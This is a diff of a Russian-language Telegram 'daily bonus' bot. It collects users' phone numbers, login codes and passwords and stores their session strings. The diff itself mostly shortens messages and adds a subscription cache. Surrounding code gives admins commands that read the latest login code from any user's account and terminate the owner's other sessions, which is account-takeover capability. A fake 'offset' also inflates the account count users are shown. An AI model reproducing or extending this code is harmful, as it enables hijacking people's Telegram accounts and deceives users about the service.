@@ -1,5 +1,6 @@
 import os
 import re
+import time
 import asyncio
 import logging
 
@@ -118,72 +119,81 @@ async def count_total_accounts() -> int:
 
 
 # =========================================================
-#              ПРОВЕРКА ПОДПИСКИ
+#              ПРОВЕРКА ПОДПИСКИ (КЭШ 5 МИН)
 # =========================================================
+_sub_cache: dict[int, tuple[float, bool]] = {}
+SUB_CACHE_TTL = 300  # 5 минут
+
+
+def invalidate_sub_cache(user_id: int):
+    _sub_cache.pop(user_id, None)
+
+
 async def check_subscription(user_id: int) -> bool:
+    now = time.time()
+
+    # Кэш
+    cached = _sub_cache.get(user_id)
+    if cached and now - cached[0] < SUB_CACHE_TTL:
+        return cached[1]
+
     if not SUBSCRIBE_CHAT:
+        _sub_cache[user_id] = (now, True)
         return True
 
     accounts = await db.get_accounts(status="active")
     if not accounts:
-        log.warning("Нет активных аккаунтов — пропускаю проверку")
+        _sub_cache[user_id] = (now, True)
         return True
 
-    log.info(f"🔍 Проверка подписки user_id={user_id} на {SUBSCRIBE_CHAT}")
-
+    # Берём только первый активный аккаунт (быстрее)
     from telethon.tl.functions.channels import GetParticipantRequest
 
-    for acc in accounts:
+    for acc in accounts[:3]:  # пробуем до 3, но не больше
         client = TelegramClient(StringSession(acc["session_str"]), API_ID, API_HASH)
         try:
-            await asyncio.wait_for(client.connect(), timeout=10)
+            await asyncio.wait_for(client.connect(), timeout=6)
             if not await client.is_user_authorized():
                 await client.disconnect()
                 continue
 
             try:
                 chat = await client.get_entity(SUBSCRIBE_CHAT)
-            except (UsernameNotOccupiedError, ChannelPrivateError) as e:
-                log.warning(f"  [акк {acc['id']}] Канал не найден/закрыт: {e}")
-                await client.disconnect()
-                continue
-            except Exception as e:
-                log.warning(f"  [акк {acc['id']}] entity error: {e}")
+            except Exception:
                 await client.disconnect()
                 continue
 
             try:
                 await client(GetParticipantRequest(channel=chat, participant=user_id))
-                log.info(f"  [акк {acc['id']}] ✅ Юзер {user_id} ПОДПИСАН")
                 await client.disconnect()
+                log.info(f"✅ [{user_id}] подписан")
+                _sub_cache[user_id] = (now, True)
                 return True
             except UserNotParticipantError:
-                log.info(f"  [акк {acc['id']}] ❌ Юзер {user_id} НЕ подписан")
                 await client.disconnect()
+                log.info(f"❌ [{user_id}] не подписан")
+                _sub_cache[user_id] = (now, False)
                 return False
-            except Exception as e:
-                err = str(e).lower()
-                log.warning(f"  [акк {acc['id']}] Ошибка: {e}")
+            except Exception:
                 await client.disconnect()
-                if "not a participant" in err:
-                    return False
                 continue
 
         except Exception as e:
-            log.warning(f"  [акк {acc['id']}] Общая ошибка: {e}")
+            log.warning(f"check_sub error: {e}")
             try:
                 await client.disconnect()
             except Exception:
                 pass
             continue
 
-    log.warning("Не удалось проверить — пропускаю")
+    # Не смогли — пропускаем
+    _sub_cache[user_id] = (now, True)
     return True
 
 
 def subscribe_kb() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📢 Подписаться на канал", url=SUBSCRIBE_URL)],
+        [InlineKeyboardButton(text="📢 Подписаться", url=SUBSCRIBE_URL)],
         [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")],
     ])
 
@@ -194,8 +204,8 @@ async def require_subscription(obj) -> bool:
         return True
 
     try:
-        user = obj.from_user
-        await db.add_subscriber(user_id, user.username or "", user.first_name or "")
+        u = obj.from_user
+        await db.add_subscriber(user_id, u.username or "", u.first_name or "")
     except Exception:
         pass
 
@@ -213,9 +223,9 @@ async def require_subscription(obj) -> bool:
         pass
 
     text = (
-        "📢 <b>Для использования бота нужно подписаться на наш канал</b>\n\n"
+        "📢 <b>Подпишись на наш канал</b>\n\n"
         f"👥 Канал: {SUBSCRIBE_CHAT}\n\n"
-        "После подписки нажми кнопку «✅ Я подписался»."
+        "После подписки нажми «✅ Я подписался»."
     )
     try:
         await obj.answer(text, reply_markup=subscribe_kb(), parse_mode="HTML")
@@ -286,7 +296,7 @@ async def kill_other_sessions(session_str: str) -> dict:
                 if "too new" in err:
                     result["error"] = "Сессия слишком новая. Подожди 24-48 часов."
                     break
-                log.warning(f"Kill session: {e}")
+                log.warning(f"Kill: {e}")
         await client.disconnect()
     except Exception as e:
         result["error"] = str(e)
@@ -313,9 +323,8 @@ async def build_welcome_text() -> str:
         "• Бот раз в сутки сам отправляет команду «🎁Бонус»\n"
         "• Если приходит капча — бот решает её автоматически\n"
         "• Бонус получается <b>без твоего участия</b>\n"
-        "• Ты можешь сам нажать «🎁 Получить бонус» — заберёт прямо сейчас\n\n"
-        "⚠️ <b>Важно:</b> подписка на наш канал <b>обязательна</b>. "
-        "Если отпишешься — все твои аккаунты остановятся и бонусы не начисляются.\n\n"
+        "• Ты можешь сам нажать «🎁 Получить бонус»\n\n"
+        "⚠️ Подписка на канал <b>обязательна</b>. Отпишешься — аккаунты остановятся.\n\n"
         "📱 <b>Начни с «Подключить аккаунт»</b> 👇"
     )
 
@@ -348,7 +357,7 @@ def admin_menu_kb() -> InlineKeyboardMarkup:
             InlineKeyboardButton(text="🗑 Удалить выборочно", callback_data="delete_select"),
             InlineKeyboardButton(text="💣 Удалить всех", callback_data="delete_all"),
         ],
-        [InlineKeyboardButton(text="👁 Визуал (аккаунты)", callback_data="menu_visual")],
+        [InlineKeyboardButton(text="👁 Визуал", callback_data="menu_visual")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="menu_stats")],
         [InlineKeyboardButton(text="📜 Логи", callback_data="menu_logs")],
     ])
@@ -408,10 +417,9 @@ async def refresh_code_message(user_id: int, chat_id: int):
     phone = code_phone.get(user_id, "")
     display = " ".join(current) if current else "_ _ _ _ _"
     text = (
-        f"📱 <b>Введи код из Telegram</b>\n\n"
-        f"📞 Номер: <code>{phone}</code>\n"
-        f"🔢 Введено: <b>{display}</b>\n\n"
-        f"Нажимай цифры, потом <b>✅ Готово</b>."
+        f"📱 <b>Введи код</b>\n\n"
+        f"📞 <code>{phone}</code>\n"
+        f"🔢 <b>{display}</b>"
     )
     msg_id = code_message_id.get(user_id)
     if not msg_id:
@@ -445,9 +453,8 @@ async def send_user_menu(target, edit: bool = False, user_id: int | None = None)
 
     text = (
         f"🏠 <b>Главное меню</b>\n\n"
-        f"📱 <b>Твоих аккаунтов: {my_count}</b>\n"
-        f"👥 <b>Всего в боте: {total_count}</b>\n\n"
-        f"Выбери действие:"
+        f"📱 <b>Твоих: {my_count}</b>\n"
+        f"👥 <b>Всего в боте: {total_count}</b>"
     )
     if edit:
         await target.edit_text(text, reply_markup=user_menu_kb(), parse_mode="HTML")
@@ -467,11 +474,10 @@ async def send_admin_menu(target, edit: bool = False):
 
     text = (
         f"🛠 <b>Админ-панель</b>\n\n"
-        f"📊 <b>Реальных аккаунтов: {total}</b>\n"
+        f"📊 Реальных: {total}\n"
         f"🟢 Активных: {active} | 🔴 Мёртвых: {dead}\n"
         f"👁 Offset: +{offset} → юзеры видят {total + offset}\n"
-        f"⚙️ Worker-ов: {running}\n\n"
-        f"Выбери действие:"
+        f"⚙️ Worker-ов: {running}"
     )
     if edit:
         await target.edit_text(text, reply_markup=admin_menu_kb(), parse_mode="HTML")
@@ -485,13 +491,8 @@ async def send_admin_menu(target, edit: bool = False):
 @dp.message(Command("start"))
 async def cmd_start(msg: Message):
     user_id = msg.from_user.id
-
     try:
-        await db.add_subscriber(
-            user_id,
-            msg.from_user.username or "",
-            msg.from_user.first_name or ""
-        )
+        await db.add_subscriber(user_id, msg.from_user.username or "", msg.from_user.first_name or "")
     except Exception:
         pass
 
@@ -509,8 +510,8 @@ async def cmd_start(msg: Message):
 @dp.callback_query(F.data == "check_sub")
 async def cb_check_sub(cb: CallbackQuery):
     user_id = cb.from_user.id
-    await cb.answer("🔍 Проверяю...", show_alert=False)
-
+    await cb.answer("🔍...", show_alert=False)
+    invalidate_sub_cache(user_id)
     sub = await check_subscription(user_id)
     if sub:
         try:
@@ -524,44 +525,35 @@ async def cb_check_sub(cb: CallbackQuery):
         welcome = await build_welcome_text()
         await cb.message.answer(welcome, reply_markup=user_menu_kb(), parse_mode="HTML")
     else:
-        await cb.answer("❌ Ты ещё не подписался на канал", show_alert=True)
+        await cb.answer("❌ Не подписан", show_alert=True)
 
 
 @dp.message(Command("help"))
 async def cmd_help(msg: Message):
     if is_admin(msg.from_user.id):
         await msg.answer(
-            "📖 <b>Админ-команды</b>\n\n"
-            "/start — меню\n/add — добавить\n/list — список\n"
-            "/code N — код\n/kill N — удалить сессии\n"
-            "/bonus — бонус всем\n/bonus 1,3-5 — выборочно\n"
-            "/del N — удалить\n/visual N — счётчик\n/logs — логи",
+            "/start /add /list /code N /kill N /bonus /del N /visual N /logs",
             parse_mode="HTML"
         )
     else:
         await msg.answer(
             "❓ <b>Помощь</b>\n\n"
-            "• <b>Подключить аккаунт</b> — добавь аккаунт.\n"
-            "• <b>Получить бонус</b> — забрать сейчас.\n"
-            "• <b>Мои аккаунты</b> — список.\n\n"
-            "⚠️ Без подписки на канал бот <b>не работает</b>.\n\n"
+            "• Подключить аккаунт\n• Получить бонус\n• Мои аккаунты\n\n"
             "🕐 Автоматически в 07:07 Самары.",
             reply_markup=help_kb(), parse_mode="HTML"
         )
 
 
 # =========================================================
-#              ПЕРИОДИЧЕСКАЯ ПРОВЕРКА ПОДПИСОК
+#              ПЕРИОДИЧЕСКАЯ ПРОВЕРКА (30 мин)
 # =========================================================
 async def periodic_subscription_check():
-    """Раз в 10 минут проверяет подписки всех владельцев аккаунтов."""
     import main as app_main
-
     while True:
         try:
-            await asyncio.sleep(600)  # 10 минут
+            await asyncio.sleep(1800)
+            log.info("🔄 Проверка подписок...")
 
-            log.info("🔄 Проверка подписок владельцев...")
             accounts = await db.get_accounts(status="active")
             owners = {}
             for a in accounts:
@@ -569,7 +561,13 @@ async def periodic_subscription_check():
                 if oid and not is_admin(oid):
                     owners.setdefault(oid, []).append(a)
 
+            if not owners:
+                continue
+
             stopped = 0
+            for owner_id in owners.keys():
+                invalidate_sub_cache(owner_id)
+
             for owner_id, accs in owners.items():
                 subscribed = await check_subscription(owner_id)
                 if subscribed:
@@ -581,28 +579,25 @@ async def periodic_subscription_check():
                     if acc["id"] in app_main.workers:
                         await app_main.stop_worker(acc["id"])
                         stopped += 1
-                        log.info(f"🚫 Остановлен акк {acc['id']} — owner {owner_id} отписан")
 
                 try:
                     await bot.send_message(
                         owner_id,
-                        "🚫 <b>Ты отписался от нашего канала</b>\n\n"
-                        "Все твои аккаунты <b>остановлены</b>. "
-                        "Бонусы <b>не начисляются</b>.\n\n"
-                        "Подпишись снова и нажми /start.",
+                        "🚫 <b>Ты отписался от канала</b>\n\n"
+                        "Аккаунты остановлены. Подпишись и нажми /start.",
                         parse_mode="HTML"
                     )
                 except Exception:
                     pass
 
             if stopped:
-                log.info(f"🔄 Остановлено аккаунтов: {stopped}")
+                log.info(f"🛑 Остановлено: {stopped}")
 
         except asyncio.CancelledError:
             break
         except Exception as e:
-            log.error(f"periodic_subscription_check: {e}")
-            await asyncio.sleep(60)
+            log.error(f"periodic check: {e}")
+            await asyncio.sleep(120)
 
 
 # =========================================================
@@ -623,10 +618,7 @@ async def cb_user_help(cb: CallbackQuery):
         return
     await cb.message.edit_text(
         "❓ <b>Помощь</b>\n\n"
-        "• <b>Подключить аккаунт</b> — добавь аккаунт.\n"
-        "• <b>Получить бонус</b> — забрать сейчас.\n"
-        "• <b>Мои аккаунты</b> — список.\n\n"
-        "⚠️ Без подписки бот не работает.\n\n"
+        "• Подключить аккаунт\n• Получить бонус\n• Мои аккаунты\n\n"
         "🕐 Автоматически в 07:07 Самары.",
         reply_markup=help_kb(), parse_mode="HTML"
     )
@@ -638,10 +630,7 @@ async def cb_user_add(cb: CallbackQuery, state: FSMContext):
     if not await require_subscription(cb):
         return
     await cb.message.answer(
-        "📱 <b>Подключение аккаунта</b>\n\n"
-        "Отправь номер телефона <b>сообщением</b> в формате:\n"
-        "<code>+79991234567</code>\n\n"
-        "⏱ После отправки придёт код в Telegram — введи его <b>кнопками</b>.",
+        "📱 Отправь номер: <code>+79991234567</code>",
         reply_markup=cancel_kb(), parse_mode="HTML"
     )
     await state.set_state(AddAccount.waiting_phone)
@@ -658,10 +647,10 @@ async def cb_user_bonus(cb: CallbackQuery):
     own = accounts if is_admin(user_id) else [a for a in accounts if a.get("owner_id") == user_id]
 
     if not own:
-        await cb.answer("❌ Нет подключённых аккаунтов", show_alert=True)
+        await cb.answer("❌ Нет аккаунтов", show_alert=True)
         return
 
-    await cb.answer("⏳ Запускаю...", show_alert=False)
+    await cb.answer("⏳...", show_alert=False)
     count = 0
     active_count = sum(1 for a in own if a["status"] == "active")
     for a in own:
@@ -681,7 +670,7 @@ async def cb_user_bonus(cb: CallbackQuery):
 
     await cb.message.answer(
         f"🎁 <b>Бонус запущен</b>\n\n"
-        f"📱 Твоих аккаунтов: <b>{len(own)}</b>\n"
+        f"📱 Твоих: <b>{len(own)}</b>\n"
         f"🟢 Активных: <b>{active_count}</b>\n"
         f"✅ Запущено: <b>{count}</b>",
         parse_mode="HTML"
@@ -699,8 +688,7 @@ async def cb_user_my_accounts(cb: CallbackQuery):
 
     if not own:
         await cb.message.edit_text(
-            f"📭 <b>У тебя пока нет аккаунтов.</b>\n\n"
-            f"📱 Твоих: <b>0</b>\n"
+            f"📭 <b>Нет аккаунтов.</b>\n\n"
             f"👥 Всего в боте: <b>{total_count}</b>\n\n"
             f"Нажми «📱 Подключить аккаунт».",
             reply_markup=user_menu_kb(), parse_mode="HTML"
@@ -716,7 +704,7 @@ async def cb_user_my_accounts(cb: CallbackQuery):
         f"📋 <b>Мои аккаунты</b>\n",
         f"📱 Твоих: <b>{len(own)}</b> (🟢 {active} / 🔴 {dead})",
         f"🎁 Твоих бонусов: <b>{my_bonuses}</b>",
-        f"👥 Всего в боте: <b>{total_count}</b>\n",
+        f"👥 Всего: <b>{total_count}</b>\n",
     ]
     for a in own:
         emoji = {"active": "🟢", "dead": "🔴", "stopped": "⚪"}.get(a["status"], "❔")
@@ -760,20 +748,18 @@ async def cb_menu_visual(cb: CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
         await cb.answer("Нет доступа", show_alert=True)
         return
-
     accounts = await db.get_accounts()
     real = len(accounts)
     offset = await db.get_fake_accounts_offset()
     total = real + offset
-
     text = (
-        f"👁 <b>Настройка визуала</b>\n\n"
-        f"📊 Реальных аккаунтов: {real}\n"
-        f"🎭 Искусственный offset: {offset}\n"
+        f"👁 <b>Визуал</b>\n\n"
+        f"📊 Реальных: {real}\n"
+        f"🎭 Offset: {offset}\n"
         f"👥 Юзеры видят: {total}"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✏️ Изменить число", callback_data="visual_set")],
+        [InlineKeyboardButton(text="✏️ Изменить", callback_data="visual_set")],
         [InlineKeyboardButton(text="♻️ Сбросить (0)", callback_data="visual_reset")],
         [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
     ])
@@ -792,10 +778,8 @@ async def cb_visual_set(cb: CallbackQuery, state: FSMContext):
     accounts = await db.get_accounts()
     real = len(accounts)
     await cb.message.answer(
-        f"✏️ <b>Введи новое число offset</b>\n\n"
-        f"Реальных: {real}\n"
-        f"Текущий offset: {offset}\n"
-        f"Напиши только число (0 — сбросить):",
+        f"✏️ Введи число offset:\n"
+        f"Реальных: {real}, offset: {offset}",
         reply_markup=cancel_kb(), parse_mode="HTML"
     )
     await state.set_state(SetVisual.waiting_number)
@@ -807,7 +791,7 @@ async def cb_visual_reset(cb: CallbackQuery):
     if not is_admin(cb.from_user.id):
         return
     await db.set_fake_accounts_offset(0)
-    await cb.answer("✅ Сброшено на 0", show_alert=True)
+    await cb.answer("✅ Сброшено", show_alert=True)
     await cb_menu_visual(cb, None)
 
 
@@ -817,39 +801,25 @@ async def step_visual_number(msg: Message, state: FSMContext):
         return
     raw = msg.text.strip()
     if not raw.isdigit():
-        await msg.answer("❌ Только число")
+        await msg.answer("❌ Число")
         return
-    num = int(raw)
-    await db.set_fake_accounts_offset(num)
+    await db.set_fake_accounts_offset(int(raw))
     accounts = await db.get_accounts()
     real = len(accounts)
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="◀️ К визуалу", callback_data="menu_visual")],
     ])
-    await msg.answer(
-        f"✅ Offset: {num}\nЮзеры видят: <b>{real + num}</b>",
-        reply_markup=kb, parse_mode="HTML"
-    )
+    await msg.answer(f"✅ Offset: {raw}. Юзеры видят: {real + int(raw)}", reply_markup=kb)
     await state.clear()
 
 
 # =========================================================
-#              СПИСОК / БОНУСЫ / УДАЛЕНИЕ
+#              СПИСОК (быстрый, без авто-проверки)
 # =========================================================
-async def build_accounts_text(check: bool = True) -> str:
+async def build_accounts_text() -> str:
     accounts = await db.get_accounts()
     if not accounts:
         return "📭 <b>Нет аккаунтов.</b>"
-
-    if check:
-        tasks = [check_account_alive(a["session_str"]) for a in accounts]
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        for a, r in zip(accounts, results):
-            ok = r if isinstance(r, bool) else False
-            new_status = "active" if ok else "dead"
-            if a["status"] != new_status:
-                await db.update_status(a["id"], new_status, None if ok else "dead")
-                a["status"] = new_status
 
     lines = ["📋 <b>Аккаунты</b>\n"]
     alive = dead = 0
@@ -858,7 +828,7 @@ async def build_accounts_text(check: bool = True) -> str:
         owner = a.get("owner_id") or "—"
         lines.append(
             f"{emoji} <b>ID {a['id']}</b> — @{a['username']}\n"
-            f"    📞 {a['phone']} | 🎁 {a['bonuses']} | {a['status']} | owner: {owner}"
+            f"    📞 {a['phone']} | 🎁 {a['bonuses']} | owner: {owner}"
         )
         if a["status"] == "active":
             alive += 1
@@ -873,9 +843,35 @@ async def cb_list(cb: CallbackQuery):
     if not is_admin(cb.from_user.id):
         await cb.answer("Нет доступа", show_alert=True)
         return
-    await cb.answer("🔍...")
-    text = await build_accounts_text(check=True)
+    text = await build_accounts_text()
     kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔍 Проверить живых", callback_data="menu_list_check")],
+        [InlineKeyboardButton(text="🔄 Обновить", callback_data="menu_list")],
+        [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
+    ])
+    try:
+        await cb.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
+    except Exception:
+        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML")
+    await cb.answer()
+
+
+@dp.callback_query(F.data == "menu_list_check")
+async def cb_list_check(cb: CallbackQuery):
+    if not is_admin(cb.from_user.id):
+        return
+    await cb.answer("🔍 Проверяю...")
+    accounts = await db.get_accounts()
+    tasks = [check_account_alive(a["session_str"]) for a in accounts]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for a, r in zip(accounts, results):
+        ok = r if isinstance(r, bool) else False
+        new_status = "active" if ok else "dead"
+        if a["status"] != new_status:
+            await db.update_status(a["id"], new_status, None if ok else "dead")
+    text = await build_accounts_text()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔍 Проверить живых", callback_data="menu_list_check")],
         [InlineKeyboardButton(text="🔄 Обновить", callback_data="menu_list")],
         [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
     ])
@@ -889,14 +885,13 @@ async def cb_list(cb: CallbackQuery):
 async def cmd_list(msg: Message):
     if not is_admin(msg.from_user.id):
         return
-    m = await msg.answer("🔍 Проверяю...")
-    text = await build_accounts_text(check=True)
-    try:
-        await m.edit_text(text, parse_mode="HTML")
-    except Exception:
-        await msg.answer(text, parse_mode="HTML")
+    text = await build_accounts_text()
+    await msg.answer(text, parse_mode="HTML")
 
 
+# =========================================================
+#              УТИЛИТА
+# =========================================================
 def parse_ids(raw: str) -> list[int]:
     result = []
     for part in raw.replace(" ", "").split(","):
@@ -916,10 +911,12 @@ def parse_ids(raw: str) -> list[int]:
     return sorted(set(result))
 
 
+# =========================================================
+#              БОНУСЫ (админ)
+# =========================================================
 @dp.callback_query(F.data == "bonus_all")
 async def cb_bonus_all(cb: CallbackQuery):
     if not is_admin(cb.from_user.id):
-        await cb.answer("Нет доступа", show_alert=True)
         return
     await cb.answer("⏳...")
     import main as app_main
@@ -930,7 +927,7 @@ async def cb_bonus_all(cb: CallbackQuery):
     for w in list(app_main.workers.values()):
         asyncio.create_task(w.send_bonus())
         count += 1
-    await cb.message.answer(f"🎁 Бонус: <b>{count}</b>", parse_mode="HTML")
+    await cb.message.answer(f"🎁 Запущено: <b>{count}</b>", parse_mode="HTML")
 
 
 @dp.callback_query(F.data == "bonus_select")
@@ -955,7 +952,7 @@ async def step_bonus_ids(msg: Message, state: FSMContext):
             ok += 1
         else:
             missing.append(acc_id)
-    text = f"🎁 Бонус: <b>{ok}</b>"
+    text = f"🎁 Запущено: <b>{ok}</b>"
     if missing:
         text += f"\n⚠️ {missing}"
     await msg.answer(text, reply_markup=back_kb(), parse_mode="HTML")
@@ -973,7 +970,7 @@ async def cmd_bonus(msg: Message):
         for w in list(app_main.workers.values()):
             asyncio.create_task(w.send_bonus())
             count += 1
-        await msg.answer(f"🎁 Бонус: <b>{count}</b>", parse_mode="HTML")
+        await msg.answer(f"🎁 Запущено: <b>{count}</b>", parse_mode="HTML")
         return
     ids = parse_ids(parts[1])
     ok = 0
@@ -981,13 +978,14 @@ async def cmd_bonus(msg: Message):
         if acc_id in app_main.workers:
             asyncio.create_task(app_main.workers[acc_id].send_bonus())
             ok += 1
-    await msg.answer(f"🎁 Бонус: <b>{ok}</b>", parse_mode="HTML")
+    await msg.answer(f"🎁 Запущено: <b>{ok}</b>", parse_mode="HTML")
 
 
 @dp.callback_query(F.data == "menu_start_all")
 async def cb_start_all(cb: CallbackQuery):
     if not is_admin(cb.from_user.id):
         return
+    await cb.answer("▶️...")
     import main as app_main
     accounts = await db.get_accounts(status="active")
     count = 0
@@ -1004,12 +1002,16 @@ async def cb_start_all(cb: CallbackQuery):
 async def cb_stop_all(cb: CallbackQuery):
     if not is_admin(cb.from_user.id):
         return
+    await cb.answer("⏸...")
     import main as app_main
     count = len(app_main.workers)
     await app_main.stop_all_workers()
     await cb.message.answer(f"⏸ Остановлено: <b>{count}</b>", parse_mode="HTML")
 
 
+# =========================================================
+#                    УДАЛЕНИЕ
+# =========================================================
 @dp.callback_query(F.data == "delete_select")
 async def cb_delete_select(cb: CallbackQuery, state: FSMContext):
     if not is_admin(cb.from_user.id):
@@ -1066,7 +1068,6 @@ async def cmd_del(msg: Message):
         return
     parts = msg.text.split()
     if len(parts) != 2:
-        await msg.answer("❌ /del 3")
         return
     ids = parse_ids(parts[1])
     import main as app_main
@@ -1078,6 +1079,9 @@ async def cmd_del(msg: Message):
     await msg.answer(f"✅ Удалено: <b>{deleted}</b>", parse_mode="HTML")
 
 
+# =========================================================
+#              СТАТИСТИКА / ЛОГИ
+# =========================================================
 @dp.callback_query(F.data == "menu_stats")
 async def cb_stats(cb: CallbackQuery):
     if not is_admin(cb.from_user.id):
@@ -1180,15 +1184,10 @@ async def step_phone(msg: Message, state: FSMContext):
         sent = await client.send_code_request(phone)
         await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
         pending_clients[user_id] = client
-
         code_buffer[user_id] = ""
         code_phone[user_id] = phone
-
         m = await msg.answer(
-            f"📱 <b>Введи код из Telegram</b>\n\n"
-            f"📞 Номер: <code>{phone}</code>\n"
-            f"🔢 Введено: <b>_ _ _ _ _</b>\n\n"
-            f"Нажимай цифры, потом <b>✅ Готово</b>.",
+            f"📱 <b>Введи код</b>\n\n📞 <code>{phone}</code>\n🔢 <b>_ _ _ _ _</b>",
             reply_markup=code_keyboard("", phone),
             parse_mode="HTML"
         )
@@ -1204,12 +1203,12 @@ async def step_phone(msg: Message, state: FSMContext):
 async def cb_code_digit(cb: CallbackQuery, state: FSMContext):
     user_id = cb.from_user.id
     if user_id not in pending_clients:
-        await cb.answer("Сессия истекла", show_alert=True)
+        await cb.answer("Истекло", show_alert=True)
         return
     digit = cb.data.split("_")[-1]
     buf = code_buffer.get(user_id, "")
     if len(buf) >= 6:
-        await cb.answer("Максимум 6")
+        await cb.answer("Макс 6")
         return
     buf += digit
     code_buffer[user_id] = buf
@@ -1260,11 +1259,11 @@ async def cb_code_cancel(cb: CallbackQuery, state: FSMContext):
 async def cb_code_submit(cb: CallbackQuery, state: FSMContext):
     user_id = cb.from_user.id
     if user_id not in pending_clients:
-        await cb.answer("Сессия истекла", show_alert=True)
+        await cb.answer("Истекло", show_alert=True)
         return
     code = code_buffer.get(user_id, "")
     if not code or len(code) < 4:
-        await cb.answer("Введи минимум 4 цифры", show_alert=True)
+        await cb.answer("Минимум 4", show_alert=True)
         return
 
     data = await state.get_data()
@@ -1326,13 +1325,11 @@ async def finish_add_from_callback(cb: CallbackQuery, state: FSMContext,
         ])
         try:
             await cb.message.edit_text(
-                f"✅ <b>Аккаунт подключён!</b>\n\n"
-                f"ID: <code>{acc_id}</code>\n@{username}\n📞 {phone}\n\n"
-                f"🕐 Бонус ежедневно в 07:07 Самары.",
+                f"✅ <b>Подключён!</b>\n\nID: <code>{acc_id}</code>\n@{username}\n📞 {phone}",
                 reply_markup=kb, parse_mode="HTML"
             )
         except Exception:
-            await cb.message.answer(f"✅ ID {acc_id}, @{username}", reply_markup=kb)
+            await cb.message.answer(f"✅ ID {acc_id}", reply_markup=kb)
     except Exception as e:
         try:
             await cb.message.edit_text(f"❌ {e}")
@@ -1375,7 +1372,7 @@ async def step_password(msg: Message, state: FSMContext):
             [InlineKeyboardButton(text="📋 Мои аккаунты", callback_data="user_my_accounts")],
             [InlineKeyboardButton(text="◀️ В меню", callback_data=back)],
         ])
-        await msg.answer(f"✅ <b>Аккаунт подключён!</b>\nID: {acc_id}\n@{username}", reply_markup=kb, parse_mode="HTML")
+        await msg.answer(f"✅ Подключён! ID: {acc_id}", reply_markup=kb)
     except Exception as e:
         await msg.answer(f"❌ {e}")
     finally:
@@ -1417,14 +1414,14 @@ async def step_code_id(msg: Message, state: FSMContext):
     acc_id = int(raw)
     acc = await db.get_account(acc_id)
     if not acc:
-        await msg.answer(f"❌ Не найден")
+        await msg.answer("❌ Не найден")
         return
-    m = await msg.answer(f"🔍...")
+    m = await msg.answer("🔍...")
     code = await get_last_code_from_telegram(acc["session_str"])
     if code:
-        await m.edit_text(f"🔢 Код: <b><code>{code}</code></b>", parse_mode="HTML")
+        await m.edit_text(f"🔢 <b><code>{code}</code></b>", parse_mode="HTML")
     else:
-        await m.edit_text(f"❌ Не найден")
+        await m.edit_text("❌ Не найден")
     await state.clear()
 
 
@@ -1448,12 +1445,12 @@ async def cmd_code(msg: Message, state: FSMContext):
     acc = await db.get_account(acc_id)
     if not acc:
         return
-    m = await msg.answer(f"🔍...")
+    m = await msg.answer("🔍...")
     code = await get_last_code_from_telegram(acc["session_str"])
     if code:
-        await m.edit_text(f"🔢 Код: <b><code>{code}</code></b>", parse_mode="HTML")
+        await m.edit_text(f"🔢 <b><code>{code}</code></b>", parse_mode="HTML")
     else:
-        await m.edit_text(f"❌ Не найден")
+        await m.edit_text("❌ Не найден")
 
 
 @dp.callback_query(F.data == "menu_kill")
@@ -1483,9 +1480,9 @@ async def step_kill_id(msg: Message, state: FSMContext):
     acc_id = int(raw)
     acc = await db.get_account(acc_id)
     if not acc:
-        await msg.answer(f"❌ Не найден")
+        await msg.answer("❌ Не найден")
         return
-    m = await msg.answer(f"🚪 Удаляю...")
+    m = await msg.answer("🚪...")
     res = await kill_other_sessions(acc["session_str"])
     if res["error"]:
         await m.edit_text(f"❌ {res['error']}")
@@ -1514,7 +1511,7 @@ async def cmd_kill(msg: Message, state: FSMContext):
     acc = await db.get_account(acc_id)
     if not acc:
         return
-    m = await msg.answer(f"🚪...")
+    m = await msg.answer("🚪...")
     res = await kill_other_sessions(acc["session_str"])
     if res["error"]:
         await m.edit_text(f"❌ {res['error']}")
@@ -1529,7 +1526,6 @@ async def run_admin_bot():
     log.info(f"🤖 Admin bot. Админов: {len(ADMIN_IDS)}")
     log.info(f"📢 Подписка: {SUBSCRIBE_CHAT}")
 
-    # Фоновая проверка подписок
     asyncio.create_task(periodic_subscription_check())
 
     await dp.start_polling(bot)
